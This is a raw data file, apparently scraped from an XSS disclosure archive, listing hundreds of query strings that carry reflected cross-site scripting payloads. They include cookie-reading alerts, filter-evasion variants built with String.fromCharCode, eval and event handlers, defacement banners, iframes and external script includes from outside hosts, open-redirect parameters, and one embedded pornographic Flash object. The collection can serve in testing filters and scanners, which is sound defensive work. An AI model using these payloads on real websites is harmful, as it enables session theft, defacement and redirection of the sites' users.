@@ -1,0 +1,615 @@
+q=<"<<sCrIpT>alert(1)</sCrIpT>
+fachbegriff=>"><ScRiPt >alert(/XSS By TurKPoweR - FROM TURKEY/);</ScRiPt><h1>XSS By TurKPoweR - FROM TURKEY</h1
+show=teams&id=126 <script>alert(String.fromCharCode(88,83,83));</script>
+id=39667&email=tglimousine@yahoo.com&site=4}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>'"><marquee><h1>XSS by Xylitol</h1></marquee>}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>'"><marquee><h1>XSS by Xylitol</h1></marquee>
+searWords="><script>alert(document.cookie)</script>><marquee><h1>CrueLChiLd</h1></marquee>
+Email=beltnews@yahoo.com}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>'"><marquee><h1>XSS by Xylitol</h1></marquee>
+start=0&sortType=1&sortOrder=1&searchmode=1&searchName="></a><script>alert(1);</script>&x=0&y=0
+keywords=test"><script>alert(1);</script>
+url=http://www.rewe.de/index.php?id=rewe_unterhaltung&title=REWE:"><Script>alert(document.cookie)</Script>
+id="><script>alert(/XSS/)</script>
+examen="><script>alert(123)</script>
+'"></title><script>alert(1337)</script>'"><marquee><h1>XSS byViper.aT</h1></marquee>
+by=Game&search="><script>alert(123)</script>
+hastalik="><script>alert(document.cookie)</script>
+topicid=543}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>'"><marquee><h1>XSS by Xylitol</h1></marquee>
+id="></title><script>alert(123)</script>><marquee><h1>XSS by Stacker</h1></marquee>
+name="><script>alert(1337)</script>
+Tag=sagali2007@yahoo.com}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>'"><marquee><h1>XSS by Xylitol</h1></marquee>
+model=>"><ScRiPt >alert(/HACKED By TurKPoweR/);</ScRiPt><h1>Defaced By TurKPoweR</h1></marquee>
+msg=<script>alert('Hacked ByStronger');</script>
+file=bbs-show.php&bbsref=09 GB 41n8 3CFI}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>'"><marquee><h1>Xss by DarkSc0rp..Secure your site..</h1></marquee>
+id="><script>alert(/xss by n-bl4x/)</script>
+listtype=search&projectname=Federal Knowledge Management Working Group (KMWG)&searchtext='"></title><script>alert(1337)</script>><marquee><h1>XSS by Xylitol</h1></marquee>
+EventosID=247}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+gameid=26&urlkeywords=City of Villains -Freedom -only'"></title><script>alert(1337)</script>'"><marquee><h1>hhhhh</h1></marquee>
+q=">'><script>alert(123)</script>
+filter=default&keyword=">'><script>alert(123)</script>
+Search=">'><script>alert(123)</script>
+search=">'><script>alert(123)</script>
+field=name&query=">'><script>alert(123)</script>
+pageid=22084&path=&oewCmd=4&ID=124&query='><script>alert(123)</script>
+lang="><script>alert(123)</script>
+page=recherche&recherche=<script>alert(123)</script>&rechercher_btn.x=0&rechercher_btn.y=0
+query=</h1><script>alert(/Lalapanzi/)</script><h1>
+query=</h1><script>alert(/Lalapanzi/)</script><h1>
+query=</h1><script>alert(/Lalapanzi/)</script><h1>
+query=</h1><script>alert(/Lalapanzi/)</script><h1>
+query=</h1><script>alert(/Lalapanzi/)</script><h1>
+query=</h1><script>alert(/Lalapanzi/)</script><h1>
+query=</h1><script>alert(/Lalapanzi/)</script><h1>
+query=</h1><script>alert(/Lalapanzi/)</script><h1>
+xcontentmode=" onmouseover=alert(/xss_by_c1c4tr1z/) "
+keyword=advanced}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+menuid=26"><script>alert(document.cookie)</script>
+dateyear=<iframe src="http://xssed.com/">
+query=<script>alert(0);</script>
+option=com_content&user_rating=1&submit_vote=index2.php?option=com_content&user_rating=1&submit_vote=x&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.com
+option=com_content&user_rating=1&submit_vote=index2.php?option=com_content&user_rating=1&submit_vote=x&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.com
+p_SID=&TEXT_CITY=<iframe+height="999"+width="999"+src="http://xssed.com/">&SUB_CITY=Search 
+linkid="><script>alert(/xssed/);</script>
+keyword='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>
+ref=37874&lg=de&sd=&sm=&sy=&ed=&em=&ey=&pname="<h1><marquee>xss+by+death-angel<script>alert(String.fromCharCode(120,+115,+115,+32,+98,+121,+32,+100,+101,+97,+116,+104,+45,+97,+110,+103,+101,+108));</script>&citta=Rom&geoid=3425&rate=&cb_sd=&cb_smy=&cb_ed=&cb_emy=&pval=&rval=&x=48&y=5o=default&r=0&m=0&n="<h1><marquee>xss+by+death-angel<script>alert(string.fromcharcode(120,+115,+115,+32,+98,+121,+32,+100,+101,+97,+116,+104,+45,+97,+110,+103,+101,+108));</script>&f=C000100000000000&sb=1
+queryx='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>&tbl=all&submit.x=10&submit.y=19
+searchtype=t&searcharg='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></m&searchscope=1&SORT=D&I1.x=13&I1.y=14&I1=Submit
+tipo="><script>alert(/xssed/);</script>
+q='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>&select=1&wd=&ss=1
+text='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>'"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>&group=1&x=16&y=9
+query=<script>alert(0);</script>
+anio="><script>alert(/xssed/);</script>
+id='"></title><script>alert(1337)</script>><marquee><h1>XSS by Xylitol</h1></marquee>
+page=1&ausername=<<<<<><<><"<<><>><"<sCrIpT>alert(document.cookie)</sCrIpT>
+id='"></title><script>alert(1337)</script>><marquee><h1>XSS by Xylitol</h1></marquee>
+page=1&sortfield=<<<<<><<><"<<><>><"<sCrIpT>alert(document.cookie)</sCrIpT>&sortorder=asc
+srchTerms="><script>alert(1)</script>&mediaType=1&srchType=Keyword&doSearch.x=11&doSearch.y=16
+p_faqid=382&p_created=109&p_sid=NFNSOU&p_lva=asdf&p_sp=asdf --> <div style=position:absolute;top:0;left:0;width:100%;height:100% onmouseover=alert(1337)></div>&p_li=&p_topview=1 
+cmd="><script>alert("JoCk3r")</script>
+keyword=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+p_sid=ofT5ySohasdf&p_lva=asdf"><body onload=alert(1337)// >&p_li=asdf&p_page=1&p_cat_lvl1=7&p_cat_lvl2=~any~&p_new_search=1&p_search_text=&p_new_search=1 
+cmd="><script>alert("JoCk3r")</script>
+cmd="><script>alert("JoCk3r")</script>
+action=hstat_year&year=<script>alert(1)</script>
+cmd="><script>alert("JoCk3r")</script>
+cmd="><script>alert("JoCk3r")</script>
+palBuscar=<img+onerror=alert(String.fromCharCode(120,115,115))+src=.%
+palBuscar=<img+onerror=alert(String.fromCharCode(120,115,115))+src=.%
+q="><script>alert(1)</script>&l=&radius=50&sort=date:D:S:d1
+msg=<script>alert(1)</script>
+msg=<script>alert(1)</script>
+loc=<"<<sCrIpT>alert(document.cookie)</sCrIpT>
+msg=<script>alert(1)</script><marquee>XSSED_bY_SaMTHG</marquee>
+cmd="><script>alert("JoCk3r")</script>
+cmd="><script>alert("JoCk3r")</script>
+cmd="><script>alert("JoCk3r")</script>
+cmd="><script>alert("JoCk3r")</script>
+year=<script>alert('xssed')</script>&s=43
+year=<script>alert('xssed')</script>&s=news_releases
+year=<script>alert('xssed')</script>&s=news_releases
+year=<script>alert('xssed')</script>&s=news_releases
+id=4'"></title><script>alert(1337)</script>><marquee><h1>XSS by Xylitol</h1></marquee>
+s=<script>alert(/xssed/)</script>
+section="><script>alert(/GeNkStAr/);</script>
+currentPage=3&recordsPerPage=25&name_flag=&from_search=true&jobcat=&industry=22&seniority=&frmPositionCountry=&pastdate=&from_possearch=&pos_ref="><script>alert(document.cookie);</script>
+view=login&ref="></a><script>alert(document.cookie);</script>
+scen=a:1:{i:0;i:75;}&ref='><script>alert(document.cookie);</script>
+fwd="><script>alert(document.cookie);</script>
+url=http://uber0n.darkillusion.org/xsspage.htm
+idc="><script>alert(/xssed/);</script>
+m=<"<<sCrIpT>alert(1337)</sCrIpT>
+query=">'><script>alert(123)</script>&submit=Sök
+subject=main_info.php&name="><script>alert(123)</script>&email_1=&email_2=&text=&x=20&y=3&subject=other&a=contact&b=contactaction
+workExp=&refineKeyword=&countrySelect=US&keyword=<iframe+src="javascript:alert('XSS+by+\nXylitol');"></iframe><marquee><h1>XSS+by+Xylitol</h1></marquee>'"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>&jobSelect=&refineKeyword=
+tulink=http://talkingphonebook.com/tusearch/timesunion/tuFcNewsWebResults.jsp?&partnerId=2&keywords=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>&x=10&y=11
+uid=&query='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>&Idx=top-idx&qc=a&ItemAt=0&MaxItem=20
+get=<script>alert(/Shocker @ www.ShockingSoft.com/)</script>
+searchNew=1&textSearchField=all&restype=groups&name=wawa';alert(123);siteser='wawa
+mid=<script>alert('PaPPy Was here');</script>
+mid=<script>alert('PaPPy Was here');</script>
+mid=<script>alert('PaPPy Was here');</script>
+mid=<script>alert('PaPPy Was here');</script>
+mid=<script>alert('PaPPy Was here');</script>
+mid=<script>alert('PaPPy Was here');</script>
+mid=<script>alert('PaPPy Was here');</script>
+mid=<script>alert('PaPPy Was here');</script>
+site="></title><script>alert(0)</script><marquee><h1>XSS by xylitol</h1></marquee>aktualnosci&search=1&kind=0
+kwbox=Szukaj"></title><script>alert(0)</script><marquee><h1>XSS by xylitol</h1></marquee>
+mode=allwords&search=friendly'"></title><script>alert(1337)</script>><marquee><h1>XSS by Xylitol</h1></marquee>
+keyword='"></title><script>alert(1337)</script>><marquee><h1>XSS by Xylitol</h1></marquee>
+mid=49&q="><script>alert("Airroxssed");</script>&Submit=Search
+qu=avon+riv'"></title><script>alert(1337)</script>><marquee><h1>XSS by Xylitol</h1></marquee>er&FreeText=&sc=/imagesns&pg=1&RankBase=473
+p=p'"></title><script>alert(1337)</script>><marquee><h1>XSS by Xylitol</h1></marquee>d&a=10&so=0&start=1&s1=LCSD,LCSD-pdf,LCSD2,LCSD3,LCSD3-chi,Cultural,Tender,LeisureOA,LeisureCRSP,Balloting&s2=HKPL&s3=HKHM&oa=1&sort=FILESIZE&oa=FILESIZE&sort=1&p2scope=0&page=2
+query='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>
+S='"></title><script>alert(1337)</script>>&N='"></title><script>alert(1337)</script>>&D='"></title><script>alert(1337)</script>>&search.x=45&search.y=6
+keyword=<script>alert(1337)</script><marquee><h1>XSS by zeryus </h1></marquee>&page=recherche
+keyword="><script>alert(0)</script>
+keyword="><script>alert(0)</script>&search=Find+now!
+q="><script>alert("DR.HACK3R")</script>
+keyword=<script>alert(1337)</script><marquee><h1>XSS+by+zeryus+</h1></marquee>&sel=2&x=0&y=0
+page=home_search&keyword="><script>alert(0)</script>
+showcat=>"><ScRiPt >alert(1);</ScRiPt>
+q="><script>alert(0)</script>&w=reviews
+id=594029&tab="><script>alert('Security is a state of mind! C1c4Tr1Z!')</script>
+whois_nic=<br>HI+XSSed.com!<br><iframe src=http://xssed.com>&x=20&y=7&type=domain
+tzoffset=180&keyword='+OR+''='&nodeid=&fid=&showSimilarDoc=true&group=Oracle.com&dupId=&start=&sort="><script>alert('XSS')</script>&pageHitCount=
+url=http://www.verisign.com/&sealid=101" onmouseover=alert('TRUSTEe?\nXSS_by_C1c4Tr1Z') "
+enqtype=PHRASE&authpara1="><script>alert(document.cookie);</script>
+errmsg=<script>alert('xssed')</script>
+cid=>'><ScRiPt >alert(666);</ScRiPt>
+sort_by=Title&show_abstract=true&zone_by=All+Zones&topic_by=All+topics&search_by="><script>alert(document.cookie);</script>&Submit.x=0&Submit.y=0
+forum=engine-beta&words="><marquee><h1>This_site_is_NOT_McAfee_Secure</h1></marquee>
+liste=1&ref=&ara_dept=T�m+Departmanlar&keywords="><script>alert(1);</script>&sxpg=1
+culture="><body onload="alert('XSS')"><metacontent="
+lank=http://uber0n.darkillusion.org/xsspage.htm&id=19&rub=meny&text=Menyalternativ
+zoom_query="><script>alert(1)</script>&Action=Go
+domain="><script>alert(1)</script>&ext=com
+mode=allwords&search=">HELLO<script>alert('xssed')</script>&submit.x=14&submit.y=12&submit=Search+>>
+code=""style="position:absolute;left:0;top:0;width:1920px;height:1200px;background-image:url(http://data.xssed.org/images/xssed_logo.gif);foo:expression(alert('XSS-IE-ONLY'))"onmousemove="alert('XSS')"
+section=/&Keyword='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>
+query="><script>alert("XSS")</script>&lang=EN&festivalName=&submit=|+search
+key=<script>alert('XSS+by+\nXyl')</script><marquee><h1>XSS+by+Xyl</h1></marquee>&search=Form&x=3&y=8
+id=33&sitem=<script>alert(/XSS+by+Xylitol/)</script><marquee><h1>XSS+by+Xylitol</h1></marquee>&submit=suchen
+enqtype=PHRASE2&authpara1="><script>alert(document.cookie);</script>&session_no=146663&catsect=
+t=1613&view=next&sid="><script>alert(/www.r3t.n3t.nl/)</script>
+function=search&search_for="><script>alert(/www.r3t.n3t.nl/)</script>
+q=<a+href="http://www.google.com"+onmouseover="alert('XSS+-+Futility')">
+keyword="><script>alert(1)</script>"><script>alert(1)</script>&category=all
+UID="><script>alert(/XSSed again by Dr.Optix/)</script>
+&openItemID="><script>alert(/www.r3t.n3t.nl/)</script>
+plz=<script>alert("XSS")</script>&radius=60&topjobs=false&track=1&volltitel=0
+company="><script>alert("Fugitif")</script>
+threadprefix="><script>alert(document.cookie);</script>
+id=2004"><script>alert(String.fromCharCode(72,65,89,65,76,69,84,75,82,65,76))</script>/12/07/relatively-absolute
+bannerID=49&zoneid=1&s&zoneid=41&source=&dest=http://seymen.org
+domain="><script>alert(1)</script>&ext=com
+bannerid=13&zoneid=1&s&zoneid=41&source=&dest=http://seymen.org
+x=0&y=0&what="><script>alert(1)</script>&where=laws
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+bannerid=4&zoneid=1&s&zoneid=41&source=&dest=http://seymen.org
+movie_id=5616&smallscreen_id="><script>alert(1)</script>
+query="<script>alert(1);</script>
+zip="><script>alert('seymen')</script>
+id="><script>alert(document.cookie)</script>><marquee><h1>BackDoor</h1></marquee>
+MIN_SPACECRAFT_CLOCK_START_COUNT="<script>alert(/XSS/)</script>
+query=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+clave="><h1>Xss by n0b0dy</h1>
+tag=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+search="><script>alert(1)</script>&Submit=Search
+cat=Arabesk&page=1&sortby="><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurKPoweR
+r="><h1><script>alert("Xssed+By+BackDoor")</script>
+s[tools.name]=<script>alert(document.cookie)</script>
+criteria=<script>alert(document.cookie)</script>
+cat_id=767&fx=event.search&loc_id=<script>alert(document.cookie)</script>
+q=<SCRIPT>alert(String.fromCharCode(115,101,121,109,101,110))</SCRIPT>
+query="></script><script>alert(1)</script>++&uqs=
+q="><script>alert(String.fromCharCode(88,83,83));</script>&searchsubmit=
+keyword="><script>alert(0)</script>
+msg=<font color=<font color="kirmizi"><h1><script>alert("xss");</script>
+q=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+action="><script>alert(document.cookie)</script>
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com
+q="><script>alert(1)</script>&submit=GO
+ReturnUrl="><script>alert(/NitrO its here/)</script>
+vh="><script>alert(1)</script>&s=ping!
+domain="><script>alert(1)</script>&ext=com
+q="><script src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js></script>
+id="><script>alert('Seymen')</script>
+email=<script>alert('genosite');</script>E&type=1
+keyword="><script>alert(document.cookie);</script>&btnG=Search&mtk=uk&enviado=1&s=0&n=10
+pid=35"><img src=. onerror=alert(/Airroxssed/[-1]);>
+year=<body onload="alert('XSS')">
+to=search&q="><script>alert("Fugitif")</script>
+survey="><script>alert("Fugitif")</script>
+cle="><marquee><h1>Defaced+by+ironzorg+for+Xssed.com</h1></marquee>&method=rapide&GO.x=0&GO.y=0
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+keyword=<script>alert(123)</script><marquee><h1>Zeryus was here !</h1></marquee>
+do=search&language=en&search_content="><script>alert(1)</script>&x=0&y=0&search_boolean=or&search_sort=date_desc
+type=2"><script>alert('XSS by C1c4Tr1Z')</script>
+Langue=FR&Pays=FR&q=<script>alert('Infomaroto')</script>
+bannerid=412&zoneid=41&source=&dest=http://seymen.org
+bannerid=2093&zoneid=1&s&zoneid=41&source=&dest=http://seymen.org
+T1=<script>alert(666)</script>
+artikel=ergebnis&db=phpprogramme&ordner=1&bildvorschau=1&krit1="><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurKPoweR
+name="><body onload=alert(/XSS/.source)></body> 
+region="><script>alert(1)</script>
+cid=220&sitio=<script>alert(5);</script>
+query=B<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+query=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+searchtext=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+q="><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurKPoweR
+col="><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurKPoweR
+LinkField="><iframesrc=http://system.premium.com.mk></iframe><script>alert(document.cookie);</script>
+showcat=>"><ScRiPt >alert(1);</ScRiPt>
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(/XSS/)</script>
+st=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+query=-<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+alang=fr&search="><marquee><h1>Defaced by ironzorg</h1></marquee>
+domain="><script>alert(1)</script>&ext=com
+resid=8713&subval=special_offers_XTR013&durl="><script>alert("Fugitif")</script>
+successurl=amF2YXNjcmlwdDphbGVydCgvWFNTLkJ5Lk1pdHlvLyk=
+q="><script>alert(1)</script>&btnG=Search+AZoM&sort=date:D:L:d1&output=xml&lr=&client=azom&filter=0&image1.x=20&oe=utf8&ie=utf8&image1.y=22&site=AZOM-ARTICLES|AZOM-NEWS|AZOM-SUPPLIERS|AZOM-BOOKS|AZOM-COURSES|AZOM-EVENTS
+bannerid=205&zoneid=1&s&zoneid=41&source=&dest=http://seymen.org
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+quickkey=kxtb2e4hwm3'//--></script><script>alert('C1c4Tr1Z')</script>&thumb=4
+mot="><script>alert("DeFaCed By SpOnSFuLL");</script>&x=0&y=0&mid=7b2eafcecddc0baf3574127d145368c0&l=fr&xml=ON&typeQuery=1
+cx=003678230413947612686:o1vg-hvnsdg&cof=FORID:9&ie=iso-8859-1&q=\"><marquee><h1>DEFACED+BY+SPONSFULL</h1></marquee>&sa=Rechercher297
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+continent="><script>alert('HACKED_By_TurKPoweR')</script><h1>HACKED-By-TurKPoweR
+txtrecherche="><marquee><h1>Defaced by ironzorg</h1></marquee>
+first_name="><script>alert(/XSS/)</script>
+u=banoffi_pie&p=1&f="><script>alert(1)</script>
+ft="><script>alert(/XSS/)</script>
+email="><script>alert(/XSS/)</script>
+name=&email="><script>alert(/XSS/)</script>
+name=<marquee><h1>cueballr</h1></marquee><script>alert('cueballr')</script>&id=18
+id=10985"><iframe src=http://turkhackeriz.com/>
+id=1'"><script>alert(document.cookie)</script>
+new="><script>alert(1)</script>
+domain="><script>alert(1)</script>&ext=com
+msg=<script>alert(31337)</script>
+q="><script>alert(1)</script>
+domain="><script>alert(1)</script>&ext=com
+threadprefix="><script>alert(document.cookie);</script>
+domain="><script>alert(1)</script>&ext=com
+Base=ISBD&SearchTerm="><script>alert(document.cookie)</script>><marquee><h1>BackDoor</h1></marquee>
+ID=3558&dil=TR&page=grup.asp&results="><script>alert(document.cookie)</script>
+id=9&bt=o&st=web&fm=pro&ec=gb2312&kw="><marquee>Defaced+BY+Sponsfull&imagefield.x=0&imagefield.y=0
+ie=UTF-8&ps=10&np=1&fm=off&q="><marquee>DEFACED BY SPONSFULL&cl=4&button=立即搜索
+page=0&typeFilter=RT&value="><script>alert(1)</script>
+Query="><script>alert(1)</script>&sortby=display_time+descending&subheader-search-button=Go&target="><script>alert(1)</script>
+t=</title><scRipT>alert(123)</scRIpT>&v=0&c=1&p=1&r=1183836020339
+PAGE=1506&PRINTAREA=<script>alert(document.cookie);</script>
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+46290936;14088510;jhttp://seymen.org
+k="><marquee>DEFACED BY SPONSFULL</marquee>&tid=1&type=电影&submit=搜索
+words="><marquee>DEFACED BY SPONSFULL</marquee>
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+menu=<script>alert(document.cookie);</script>
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+Mtd=1&StrKey="><script>alert("g3");</script>
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+bannerid=412&zoneid=1&s&zoneid=41&source=&dest=http://seymen.org
+bannerid=26&zoneid=1&s&zoneid=41&source=&dest=http://seymen.org
+redir=bin/login.html?redir="><script>alert('TreX')</script><h1>Hacked By TreX</h1>
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+threadprefix="><script>alert(document.cookie);</script>
+q="><marquee>defaced by sponsfull</marquee>
+domain="><script>alert(1)</script>&ext=com
+vmemid=135&vmemname="><script>alert('seymen')</script>
+domain="><script>alert(1)</script>&ext=com
+urlid=419961&link=http://xssed.com
+domain="><script>alert(1)</script>&ext=com
+v=1\\\\&type3_package=3&submit_package=package&aid=&c_code=&submit=Lookup+Domain+>>&submit_domain=register&new_domain=\&new_tld_extension=com&new_domain="+onclick=alert(/XSS_by_C1c4Tr1Z/)+"&tld_extension=com&submit=Lookup+Domain+>>
+id="><script>alert(/Shocker @ www.ShockingSoft.com/)</script>
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com
+hata=<h1>backdoor<marquee>BackDoor</marquee><script>alert(document.cookie)</script>
+orderby=&text_condition=all&searchboxtyped=short&text="><script>alert(1)</script>&SEARCH=Search&text_fields=headline+content
+forumID="><script>alert('TreX')</script><h1>Hacked By TreX</h1>
+query=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+query=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+q=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+keyword=<script>alert(0)</script><marquee><h1>Zer&submit=Search&action=search
+articlesMax=20&downloadsMax=20&forumsMax=20&reviewsMax=20&staticMax=20&source=+AND+(information-technology:SOURCE)&articlesMinscore=65&q=');--></script><img src onerror=alert('XSS')>
+Q.Theme=World+News"><h1>XSS by C1c4Tr1Z</h1>;Europe&Q.Search=&Q.Referrer=http://www.NewsNow.co.uk/h/World+News/Europe?name=World+News;Europe
+returnUrl="><script>alert(/darkm1nd.net/)</script>
+stxt="><object+classid='clsid:d27cdb6e-ae6d-11cf-96b8-444553540000'codebase='http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,18,0'width='480'+�height='400'+id='pornoPlayer'+align='middle'><param+name='allowScriptAccess'+value='sameDomain'+/><param+name='allowFullScreen'+value='true'+/><param+name='movie'+value='http://www.pornotube.com/player/v.swf?v=bT0xNjE1NDUyJmFtcDtsb2NhbD10cnVlJmFtcDt1PTEz'+/><param+name='bgcolor'+value='#000000'+/><embed+src='http://www.pornotube.com/player/v.swf?v=bT0xNjE1NDUyJmFtcDtsb2NhbD10cnVlJmFtcDt1PTEz'+allowFullScreen='true'+bgcolor='#000000'+width='480'+height='400'name='pornoPlayer'+align='middle'+type='application/x-shockwave-flash'pluginspage='http://www.macromedia.com/go/getflashplayer'+/></object>
+dizin="><script>alert(document.cookie)</script>
+searchstring=<script>alert("U-S-A !!")</script>&submit.x=6&submit.y=7
+qs="><script>alert('HACKED_By_TurKPoweR')</script><h1>HACKED-By-TurKPoweR
+test=all&lang="><script>alert(/xssed/)</script>&lang2=ocaml
+vUrl="><h1>WTF?! XSS by C1c4Tr1Z!</h1><script>alert('C1c4Tr1Z')</script>
+searchstring="><script>alert(1);</script>
+id=168"<script>alert(/xss/)</script><foo "
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+ID=7&query='>><marquee><h1>XSS XSS XSS XSS XSS XSS</h1></marquee>&case=&whole=&lines=&errors=&age=&maxfiles=25&maxlines=20&maxchars=1000&filter=&cache=yes&rankby=DEFAULT
+date=071004_ueberblick&img=0"><script>alert(23)</script>
+ACCT=1&TICK=TRUE&STORY=/www/story/05-13-2008/0004812032&EDATE="><body	onload="alert('XSS')">
+address=<script>alert('Hacked by mBz The-Operations.Org');</script>&range=2&search=Trouver
+domain="><script>alert(1)</script>&ext=com
+fullText=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&x=0&y=0&type=rmc
+search=<script>alert('XSS+by+\nXylitol')</script><marquee><h1>XSS+by+Xylitol</h1></marquee>
+univ=<script>alert('XSS by \nXylitol')</script><marquee><h1>XSS by Xylitol</h1></marquee>
+prov=emploi&univ=3&fiche=<script>alert('XSS by \nXylitol')</script><marquee><h1>XSS by Xylitol</h1></marquee>
+texterecherche=<script>alert('XSS+by+\nXylitol')</script><marquee><h1>XSS+by+Xylitol</h1></marquee>&search=Rechercher
+recherche="><marquee><h1>Defaced+by+ironzorg</h1></marquee>&do_recherche=OK
+recherche=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&imageField2.x=0&imageField2.y=0
+criteres=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&x=28&y=11&type=or
+action=2&recherche=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&type=0&Envoi=Rechercher+dans+INDEXA
+back=1&mode=societe&societe=<script>alert("Zeryus")</script>
+SearchField=keywords&search=<script>alert("Zeryus")</script>
+recherche=<script>alert("Zeryus")</script>&submit.x=0&submit.y=0
+q=<script>alert("Zeryus")</script>&x=0&y=0
+ra=<script>alert(0)</script>resultat
+q=<script>alert("Zeryus")</script>
+pageid=2&coe_i_id=59&keyword=<script>alert("Zeryus")</script>&rech_chek=2&type=recherche&start=20&end=39&recherche
+query="><script>alert(1)</script>&x=9&y=9
+bug_age=0&bug_type=&cmd=display&direction=ASC&limit=10<script>alert(document.cookie)</script>&os=0&search_for=usr&severity=1&status=Duplicate  
+m=l&s=1&z=<script>alert(123456789)</script>
+recherche_site='"></title><script>alert('Damned!')</script>
+catID=4&cat="><script>alert('seymen')</script>
+sektor=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))</script>
+q=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82))</script>
+query=<script>alert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82))</script>
